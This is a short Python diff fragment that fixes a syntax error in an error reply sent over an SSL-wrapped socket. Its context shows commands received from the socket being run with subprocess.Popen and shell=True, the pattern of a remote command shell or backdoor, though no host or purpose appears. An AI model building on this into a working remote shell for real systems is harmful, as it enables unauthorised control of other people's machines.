@@ -43,7 +43,7 @@ try:
                 elif not output:
                     wrappedSocket.sendall(err)
                 else:
-                    wrappedSocket.sendall("err"ex)
+                    wrappedSocket.sendall("err")
         else:
             command = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, 
                                        stderr=subprocess.PIPE)
